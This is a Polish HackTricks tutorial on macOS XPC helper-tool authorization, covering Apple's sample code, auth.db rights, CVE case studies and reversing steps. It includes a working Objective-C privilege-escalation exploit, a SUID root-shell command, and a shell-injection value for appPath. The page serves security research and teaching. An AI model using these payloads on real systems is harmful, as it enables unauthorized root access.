# Autoryzacja XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Autoryzacja XPC

Apple oferuje również inny sposób uwierzytelniania, który pozwala sprawdzić, czy proces nawiązujący połączenie ma **uprawnienia do wywołania udostępnionej metody XPC**.

Gdy aplikacja musi **wykonywać działania jako uprzywilejowany użytkownik**, zamiast uruchamiać aplikację jako uprzywilejowany użytkownik, zazwyczaj instaluje jako root narzędzie HelperTool jako usługę XPC, którą aplikacja może wywołać w celu wykonania tych działań. Aplikacja wywołująca usługę powinna jednak mieć wystarczające uprawnienia.

### ShouldAcceptNewConnection zawsze YES

Przykład można znaleźć w [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). W pliku `App/AppDelegate.m` aplikacja próbuje **połączyć się** z **HelperTool**. Natomiast w pliku `HelperTool/HelperTool.m` funkcja **`shouldAcceptNewConnection`** **nie sprawdza** żadnego z wymagań wskazanych wcześniej. Zawsze zwraca YES:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Więcej informacji na temat prawidłowej konfiguracji tego sprawdzenia:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Uprawnienia aplikacji

Jednak **podczas wywoływania metody z HelperTool przeprowadzana jest autoryzacja**.

Funkcja **`applicationDidFinishLaunching`** z pliku `App/AppDelegate.m` utworzy pusty obiekt referencyjny autoryzacji po uruchomieniu aplikacji. Powinno to zawsze działać.\
Następnie spróbuje **dodać pewne uprawnienia** do tego obiektu referencyjnego autoryzacji, wywołując `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcja `setupAuthorizationRights` z pliku `Common/Common.m` zapisze w bazie auth `/var/db/auth.db` uprawnienia aplikacji. Zwróć uwagę, że doda tylko uprawnienia, których nie ma jeszcze w bazie danych:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcja `enumerateRightsUsingBlock` służy do uzyskiwania uprawnień aplikacji, które są zdefiniowane w `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Oznacza to, że na końcu tego procesu uprawnienia zadeklarowane wewnątrz `commandInfo` zostaną zapisane w `/var/db/auth.db`. Zwróć uwagę, że można tam znaleźć dla **każdej metody**, która będzie **wymagać uwierzytelnienia**, **nazwę uprawnienia** oraz **`kCommandKeyAuthRightDefault`**. To ostatnie **wskazuje, kto może uzyskać to uprawnienie**.

Istnieją różne zakresy określające, kto może uzyskać dostęp do uprawnienia. Niektóre z nich są zdefiniowane w [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (możesz znaleźć [wszystkie tutaj](https://www.dssw.co.uk/reference/authorization-rights/)), ale w skrócie:

<table><thead><tr><th width="284.3333333333333">Nazwa</th><th width="165">Wartość</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Każdy</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nikt</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Bieżący użytkownik musi być administratorem (należeć do grupy administratorów)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Poproś użytkownika o uwierzytelnienie.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Poproś użytkownika o uwierzytelnienie. Musi on być administratorem (należeć do grupy administratorów)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Określa reguły</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Określa dodatkowe komentarze dotyczące uprawnienia</td></tr></tbody></table>

### Weryfikacja uprawnień

W `HelperTool/HelperTool.m` funkcja **`readLicenseKeyAuthorization`** sprawdza, czy wywołujący jest uprawniony do **wykonania takiej metody**, wywołując funkcję **`checkAuthorization`**. Funkcja ta sprawdza, czy przesłane przez wywołujący proces dane **authData** mają **prawidłowy format**, a następnie sprawdza, **co jest wymagane do uzyskania uprawnienia** do wywołania określonej metody. Jeśli wszystko przebiegnie pomyślnie, **zwrócony `error` będzie miał wartość `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Należy zauważyć, że aby **sprawdzić wymagania uzyskania uprawnienia** do wywołania tej metody, funkcja `authorizationRightForCommand` po prostu sprawdzi wcześniej wspomniany obiekt **`commandInfo`**. Następnie wywoła **`AuthorizationCopyRights`**, aby sprawdzić, **czy posiada uprawnienia** do wywołania funkcji (należy zauważyć, że flagi umożliwiają interakcję z użytkownikiem).

W tym przypadku, aby wywołać funkcję `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` jest zdefiniowane jako `@kAuthorizationRuleClassAllow`. Zatem **każdy może ją wywołać**.

### Informacje o DB

Wspomniano, że te informacje są przechowywane w `/var/db/auth.db`. Wszystkie zapisane reguły można wyświetlić za pomocą:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Następnie możesz sprawdzić, kto może uzyskać dostęp do tego uprawnienia za pomocą:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Prawa o liberalnych uprawnieniach

Możesz znaleźć **wszystkie konfiguracje uprawnień** [**tutaj**](https://www.dssw.co.uk/reference/authorization-rights/), ale kombinacje, które nie będą wymagać interakcji użytkownika, to:

1. **'authenticate-user': 'false'**
- Jest to najbardziej bezpośredni klucz. Jeśli zostanie ustawiony na `false`, oznacza to, że użytkownik nie musi przeprowadzać uwierzytelniania, aby uzyskać to prawo.
- Jest używany **w połączeniu z jednym z 2 poniższych kluczy lub ze wskazaniem grupy**, do której użytkownik musi należeć.
2. **'allow-root': 'true'**
- Jeśli użytkownik działa jako root (który ma podwyższone uprawnienia), a ten klucz jest ustawiony na `true`, root może potencjalnie uzyskać to prawo bez dodatkowego uwierzytelniania. Zwykle jednak uzyskanie statusu root już wymaga uwierzytelniania, więc dla większości użytkowników nie jest to scenariusz „bez uwierzytelniania”.
3. **'session-owner': 'true'**
- Jeśli wartość jest ustawiona na `true`, właściciel sesji (aktualnie zalogowany użytkownik) automatycznie uzyska to prawo. Może to pominąć dodatkowe uwierzytelnianie, jeśli użytkownik jest już zalogowany.
4. **'shared': 'true'**
- Ten klucz nie przyznaje praw bez uwierzytelniania. Jeśli jest ustawiony na `true`, oznacza to, że po uwierzytelnieniu dane prawo może być współdzielone między wieloma procesami bez konieczności ponownego uwierzytelniania każdego z nich. Początkowe przyznanie prawa nadal będzie jednak wymagać uwierzytelniania, chyba że zostanie połączone z innymi kluczami, takimi jak `'authenticate-user': 'false'`.

Możesz [**użyć tego skryptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), aby uzyskać interesujące prawa:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Studia przypadków omijania autoryzacji

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Uprzywilejowana usługa Mach `com.acustica.HelperTool` akceptuje każde połączenie, a jej procedura `checkAuthorization:` wywołuje `AuthorizationCopyRights(NULL, …)`, dzięki czemu dowolny 32-bajtowy blob przechodzi walidację. Następnie `executeCommand:authorization:withReply:` przekazuje kontrolowane przez atakującego ciągi rozdzielane przecinkami do `NSTask` jako root, umożliwiając payloady takie jak:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trywialnie utworzyć shell SUID root. Szczegóły w [tym write-upie](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener zawsze zwraca YES, a ten sam wzorzec `AuthorizationCopyRights` z wartością NULL pojawia się w `checkAuthorization:`. Metoda `exchangeAppWithReply:` dwukrotnie konkaten’uje dane wejściowe atakującego do ciągu `system()`, więc wstrzyknięcie metaznaków shell w `appPath` (np. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) umożliwia wykonanie kodu z uprawnieniami root za pośrednictwem Mach service `com.plugin-alliance.pa-installationhelper`. Więcej informacji [tutaj](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[7]</sup>
- **CVE-2024-4395 – helper Jamf Compliance Editor**: uruchomienie audytu tworzy `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, udostępnia Mach service `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez weryfikowania `AuthorizationExternalForm` ani code signature wywołującego. Trywialny exploit tworzy pustą referencję za pomocą `AuthorizationCreate`, łączy się przez `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i wywołuje metodę w celu wykonania dowolnych binary jako root. Pełne notatki z reverse engineeringu (wraz z PoC) znajdują się w [write-upie Mykoli Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[4]</sup>
- **CVE-2025-25251 – helper FortiClient Mac**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 oraz 7.4.0–7.4.2 akceptował spreparowane wiadomości XPC, które docierały do uprzywilejowanego helpera pozbawionego mechanizmów autoryzacji. Ponieważ helper ufał własnemu uprzywilejowanemu `AuthorizationRef`, każdy lokalny użytkownik mogący wysyłać wiadomości do service mógł zmusić go do wykonania dowolnych zmian konfiguracji lub commands jako root. Szczegóły znajdują się w [podsumowaniu advisory SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[5]</sup>

#### Wskazówki dotyczące szybkiego triage

- Gdy aplikacja dostarcza zarówno GUI, jak i helper, porównaj ich wymagania dotyczące kodu i sprawdź, czy `shouldAcceptNewConnection` blokuje listener za pomocą `-setCodeSigningRequirement:` (lub weryfikuje `SecCodeCopySigningInformation`). Brak tych kontroli zwykle prowadzi do scenariuszy CWE-863, takich jak w przypadku Jamf. Szybki podgląd wygląda następująco:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Porównaj to, co helper *uważa*, że autoryzuje, z tym, co dostarcza klient. Podczas reverse engineeringu ustaw breakpoint na `AuthorizationCopyRights` i potwierdź, że `AuthorizationRef` pochodzi z `AuthorizationCreateFromExternalForm` (dostarczonego przez klienta), a nie z własnego uprzywilejowanego kontekstu helpera. W przeciwnym razie prawdopodobnie znaleziono wzorzec CWE-863 podobny do powyższych przypadków.

## Reversing Authorization

### Sprawdzanie, czy używany jest EvenBetterAuthorization

Jeśli znajdziesz funkcję: **`[HelperTool checkAuthorization:command:]`**, prawdopodobnie proces używa wcześniej wspomnianego schematu autoryzacji:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Jeśli ta funkcja wywołuje takie funkcje jak `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, oznacza to, że używa [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Sprawdź **`/var/db/auth.db`**, aby zobaczyć, czy możliwe jest uzyskanie uprawnień do wywołania uprzywilejowanej akcji bez interakcji z użytkownikiem.

### Protocol Communication

Następnie musisz znaleźć schemat protocol, aby móc ustanowić komunikację z usługą XPC.

Funkcja **`shouldAcceptNewConnection`** wskazuje eksportowany protocol:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

W tym przypadku mamy to samo co w EvenBetterAuthorizationSample — [**sprawdź tę linię**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znając nazwę używanego protocol, można **zrzucić jego definicję headera** za pomocą:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na koniec musimy tylko poznać **nazwę ujawnionej usługi Mach**, aby nawiązać z nią komunikację. Można ją znaleźć na kilka sposobów:

- W **`[HelperTool init]`**, gdzie można zobaczyć używaną usługę Mach:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- W pliku plist launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Przykład Exploit

W tym przykładzie utworzono:

- Definicję protokołu z funkcjami
- Pusty `auth` używany do żądania dostępu
- Połączenie z usługą XPC
- Wywołanie funkcji, jeśli połączenie zakończyło się powodzeniem
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Inne nadużywane XPC privilege helpers

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## Odnośniki

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: eskalacja uprawnień w Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: luka umożliwiająca eskalację uprawnień w FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – lokalna eskalacja uprawnień w usłudze Acustica Audio HelperTool XPC w Aquarius Desktop na macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – lokalna eskalacja uprawnień w usłudze InstallationHelper XPC Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: eskalacja uprawnień w Apple EndpointSecurity framework (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
